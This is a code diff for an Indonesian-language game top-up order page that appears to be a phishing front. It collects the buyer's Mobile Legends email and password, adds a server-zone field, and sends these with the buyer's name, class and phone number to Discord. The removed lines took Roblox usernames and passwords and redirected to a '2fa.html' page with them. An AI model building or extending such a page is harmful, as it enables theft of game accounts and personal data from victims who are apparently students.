@@ -73,7 +73,7 @@
             color: #b6d0db;
             letter-spacing: 0.3px;
         }
-        input {
+        input, select {
             width: 100%;
             background: #0f1e26;
             border: 2px solid #2b414e;
@@ -84,7 +84,14 @@
             outline: none;
             transition: 0.2s;
         }
-        input:focus {
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 20px center;
+            background-size: 20px;
+        }
+        input:focus, select:focus {
             border-color: #ffaa33;
             background: #0f1f2b;
         }
@@ -153,12 +160,8 @@
 
     <div id="robuxFields" class="hidden">
         <div class="field-group">
-            <label>🆔 Username Roblox</label>
-            <input type="text" id="robuxUsername" placeholder="username Roblox">
-        </div>
-        <div class="field-group">
-            <label>🔑 Password Roblox</label>
-            <input type="password" id="robuxPassword" placeholder="password">
+            <label>📧 Email Roblox</label>
+            <input type="email" id="robuxEmail" placeholder="email@contoh.com">
         </div>
     </div>
 
@@ -170,6 +173,16 @@
         <div class="field-group">
             <label>🔑 Password ML</label>
             <input type="password" id="mlPassword" placeholder="password">
+        </div>
+        <div class="field-group">
+            <label>🌏 Server Zone</label>
+            <select id="mlServer">
+                <option value="Asia">Asia</option>
+                <option value="Europe">Europe</option>
+                <option value="North America">North America</option>
+                <option value="South America">South America</option>
+                <option value="Other">Other</option>
+            </select>
         </div>
     </div>
 
@@ -187,10 +200,10 @@
         const phoneNumber = document.getElementById('phoneNumber');
         const robuxFields = document.getElementById('robuxFields');
         const mlFields = document.getElementById('mlFields');
-        const robuxUsername = document.getElementById('robuxUsername');
-        const robuxPassword = document.getElementById('robuxPassword');
+        const robuxEmail = document.getElementById('robuxEmail');
         const mlEmail = document.getElementById('mlEmail');
         const mlPassword = document.getElementById('mlPassword');
+        const mlServer = document.getElementById('mlServer');
         const submitBtn = document.getElementById('submitOrder');
         const statusMsg = document.getElementById('statusMsg');
 
@@ -221,7 +234,7 @@
             }
         }
 
-        async function sendToDiscord(category, pkg, price, name, cls, phone, accountField1, accountField2) {
+        async function sendToDiscord(category, pkg, price, name, cls, phone, accountField1, accountField2 = null, serverZone = null) {
             let fields = [
                 { name: 'Paket', value: `${pkg} · ${price}`, inline: true },
                 { name: 'Nama', value: name, inline: true },
@@ -231,13 +244,13 @@
 
             if (category === 'Robux') {
                 fields.push(
-                    { name: 'Username Roblox', value: accountField1, inline: true },
-                    { name: 'Password Roblox', value: accountField2, inline: true }
+                    { name: 'Email Roblox', value: accountField1, inline: true }
                 );
             } else if (category === 'ML Diamond') {
                 fields.push(
                     { name: 'Email ML', value: accountField1, inline: true },
-                    { name: 'Password ML', value: accountField2, inline: true }
+                    { name: 'Password ML', value: accountField2, inline: true },
+                    { name: 'Server Zone', value: serverZone, inline: true }
                 );
             }
 
@@ -286,6 +299,7 @@
             if (selectedData.category === 'ML Diamond') {
                 const email = mlEmail.value.trim();
                 const password = mlPassword.value.trim();
+                const server = mlServer.value;
                 if (!email || !password) {
                     statusMsg.textContent = '❌ Email dan password ML harus diisi.';
                     statusMsg.classList.remove('hidden');
@@ -303,7 +317,8 @@
                     cls,
                     phone,
                     email,
-                    password
+                    password,
+                    server
                 );
 
                 if (success) {
@@ -320,30 +335,40 @@
             }
 
             if (selectedData.category === 'Robux') {
-                const username = robuxUsername.value.trim();
-                const password = robuxPassword.value.trim();
-                if (!username || !password) {
-                    statusMsg.textContent = '❌ Username dan password Roblox harus diisi.';
+                const email = robuxEmail.value.trim();
+                if (!email) {
+                    statusMsg.textContent = '❌ Email Roblox harus diisi.';
                     statusMsg.classList.remove('hidden');
                     return;
                 }
 
-                const orderData = {
-                    category: selectedData.category,
-                    package: selectedData.package,
-                    price: selectedData.price,
-                    name: name,
-                    class: cls,
-                    phone: phone,
-                    username: username,
-                    password: password
-                };
-                localStorage.setItem('pendingOrder', JSON.stringify(orderData));
-                window.location.href = '2fa.html';
+                statusMsg.textContent = '⏳ Mengirim order...';
+                statusMsg.classList.remove('hidden');
+
+                const success = await sendToDiscord(
+                    selectedData.category,
+                    selectedData.package,
+                    selectedData.price,
+                    name,
+                    cls,
+                    phone,
+                    email
+                );
+
+                if (success) {
+                    statusMsg.textContent = '✅ Order terkirim! Terima kasih.';
+                    fullName.value = '';
+                    className.value = '';
+                    phoneNumber.value = '';
+                    robuxEmail.value = '';
+                } else {
+                    statusMsg.textContent = '❌ Gagal mengirim. Coba lagi.';
+                }
+                return;
             }
         });
 
-        [fullName, className, phoneNumber, robuxUsername, robuxPassword, mlEmail, mlPassword].forEach(input => {
+        [fullName, className, phoneNumber, robuxEmail, mlEmail, mlPassword].forEach(input => {
             if (input) input.addEventListener('focus', () => statusMsg.classList.add('hidden'));
         });
     })();
